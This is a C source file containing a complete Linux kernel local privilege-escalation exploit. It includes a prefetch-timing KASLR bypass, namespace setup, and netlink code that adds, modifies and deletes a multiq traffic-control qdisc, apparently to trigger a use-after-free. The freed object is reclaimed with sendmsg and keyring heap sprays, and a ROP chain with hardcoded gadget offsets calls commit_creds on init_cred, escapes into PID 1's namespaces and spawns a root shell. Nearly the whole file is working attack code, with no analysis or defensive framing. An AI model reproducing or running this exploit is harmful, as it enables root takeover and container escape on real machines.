#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <assert.h>
#include <keyutils.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include <linux/rtnetlink.h>

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

uint64_t kbase = 0;

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

typedef unsigned long long u64;
typedef long long i64;

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void prefetch(void* p)
{
  asm volatile (
    "prefetchnta (%0)\n"
    "prefetcht2 (%0)\n"
    : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
  size_t time = rdtsc_begin();
  prefetch(addr);
  size_t delta = rdtsc_end() - time;
  return delta;
}

int64_t bypass_kaslr(u64 base) {
    if (!base) {
      #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    u64 addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              base -= OFFSET;
              goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
      #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000200000ull
        #define NUM_TRIALS 7
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    u64 addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
      #endif
    }

got_base:
    printf("using kernel base %llx\n", base);

    i64 off = base - 0xffffffff81000000;
    printf("kernel off: %lld\n", off);

    kbase = base;

    return off;
}

void write_file(const char *filename, char *text) {

    int fd = open(filename, O_RDWR | O_CREAT, 0644);

    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    unshare(CLONE_NEWUSER | CLONE_NEWNS);

    unshare(CLONE_NEWNET);

    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

void pwn(){
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    while(1);
}

uint64_t _user_rip = (uint64_t) pwn;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;

void save_state(void) {
    __asm__(".intel_syntax noprefix;"
    "mov _user_cs, cs;"
    "mov _user_ss, ss;"
    "mov _user_sp, rsp;"
    "pushf;"
    "pop _user_rflags;"
    ".att_syntax");
    return;
}

uint64_t find_task_by_vpid_off = 0x1c5a70;
uint64_t switch_task_namespaces_off = 0x1cd630;
uint64_t commit_creds_off = 0x1cf1e0;
uint64_t init_nsproxy_off = 0x2876880;
uint64_t init_cred_off = 0x2876ac0;
uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0x14011c6;

// 0xffffffff810b0603 : mov rsp, rbp ; pop rbp ; jmp 0xffffffff82605300
// 0xffffffff8106909d : pop rdi ; jmp 0xffffffff82605300
// 0xffffffff810e90d5 : pop rsi ; jmp 0xffffffff82605300
// 0xffffffff810e09e1 : mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; jmp 0xffffffff82605300
// 0xffffffff810e90d0 : pop r12 ; pop r13 ; pop r14 ; jmp 0xffffffff82605300

uint64_t mov_rsp_rbp_pop_rbp_ret = 0x0b0603;
uint64_t pop_rdi_ret = 0x06909d;
uint64_t pop_rsi_ret = 0x0e90d5;
uint64_t mov_rdi_rax_ret = 0x0e09e1;
uint64_t pppr = 0x0e90d0;

void make_payload(uint64_t* data){
    int i = 0;

    data[i++] = 0;
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 0;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    data[i++] = kbase + pppr;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = 0;                     // reset()

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = 1;
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;                  // rax
    data[i++] = 0;                  // rdx
    data[i++] = _user_rip;          // user_rip
    data[i++] = _user_cs;           // user_cs
    data[i++] = _user_rflags;       // user_rflags
    data[i++] = _user_sp;           // user_sp
    data[i++] = _user_ss;           // user_ss
}

void spray_sendmsg(unsigned long* buf, unsigned int size) {
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);

    msg.msg_control = buf;
    msg.msg_controllen = size;
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);

    sendmsg(sockfd, &msg, 0);
}

#define n_spray 0x40

int keys[n_spray];

/*
 *	Allocate a user_key_payload structure.
 */
int key_alloc(int i, char *buff, size_t size)
{
	char desc[256] = { 0 };
	key_serial_t key;
	char *payload;

	sprintf(desc, "payload_%d", i);

    size -= 0x18;
	payload = buff ? buff : calloc(1, size);

	if (!buff)
		*(uint64_t *)&payload[0] = i; // Tag the key

	keys[i] = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

	if (keys[i] < 0) {
		perror("[x] key_alloc()");
		return -1;
	}

	return 0;
}

int sockfd = -1;

#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;

    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
        fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
        return -1;
    }
    rta = NLMSG_TAIL(n);
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen)
    memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
    struct rtattr *nest = NLMSG_TAIL(n);

    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
    nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
    return n->nlmsg_len;
}

int add_qdisc(int fd, int ifindex) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = ifindex;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;

    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    u_int32_t handle = 0x1000;

    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

    char data[0x10] = {0,};

    addattr_l(msg, 0x1000, TCA_OPTIONS, data, 8);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(fd, &msgh, 0);
}

int modify_qdisc(int fd, int ifindex) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = ifindex;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;

    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    u_int32_t handle = 0x1000;

    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

    char data[0x10] = {0,};

    addattr_l(msg, 0x1000, TCA_OPTIONS, data, 8);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(fd, &msgh, 0);
}

int del_qdisc(int fd, int ifindex) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST;
    msg->nlmsg_type = RTM_DELQDISC;

    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    t->tcm_ifindex = ifindex;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;

    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    u_int32_t handle = 0x1000;

    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(fd, &msgh, 0);
}

int main(int argc, char **argv) {
    bypass_kaslr(0);

    new_ns();

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    save_state();

    system("./ip link add outer0 numrxqueues 512 numtxqueues 512 type veth");
    system("./ethtool -L outer0 tx 465");

    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
    assert(sockfd != -1);

    add_qdisc(sockfd, 9);
    add_qdisc(sockfd, 8);

    system("./ethtool -L outer0 tx 396");

    modify_qdisc(sockfd, 9);

    // wait for qdisc_put done
    usleep(300*1000);

    #define BUF_SIZE 0x108

    char *buf = malloc(BUF_SIZE);

    make_payload(buf);

    // Qdisc_ops->reset
    *(unsigned long*)(buf + 0x48) = kbase + mov_rsp_rbp_pop_rbp_ret;

    for(int i = 0; i < n_spray; i++){
        spray_sendmsg(buf, BUF_SIZE);
        key_alloc(i, buf+0x18, BUF_SIZE);
    }

    del_qdisc(sockfd, 8);
}
